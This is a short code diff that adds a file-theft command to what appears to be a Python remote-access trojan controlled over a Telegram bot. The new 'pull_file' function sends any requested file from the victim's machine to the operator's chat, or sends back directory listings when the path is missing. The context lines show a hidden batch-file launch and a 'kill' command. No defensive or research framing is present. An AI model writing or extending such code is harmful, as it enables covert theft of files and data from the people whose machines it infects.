@@ -305,6 +305,20 @@ sh.Run "{pth}\\upd.bat", 0'''
                 r.post(url, data={'a':'b','c':'d'})
                 r.get(url)
             except: pass
+    def pull_file(self, path:str):
+        path =path.replace('\\','/')
+        if os.path.exists(path):
+            file = open(path, 'rb')
+            bot.send_document(self.id, file)
+        else:
+            path = path.split('/')
+            if len(path) <= 1:
+                otv = f"🖥❌ File not found \n|{os.getcwd()}\n|--  "+'\n|--  '.join(os.listdir(os.getcwd()))
+            else:
+                pr = '/'.join(path[:-1])
+                otv = f"🖥❌ File not found \n|{pr}\n|--  "+'\n|--  '.join(os.listdir(pr))
+            bot.send_message(self.id,otv)
+        
 
     def perfor(self,text):
         
@@ -384,6 +398,9 @@ sh.Run "{pth}\\upd.bat", 0'''
                     bot.send_message(self.id, '🖥✅')
                 except:
                     bot.send_message(self.id, '🖥❌')
+            
+            if comnd=="pull" or comnd=="pull_file":
+                threading.Thread(target=self.pull_file, args=(text_comand[0], )).start()
 
             if comnd=="kill":
                 self.exits()
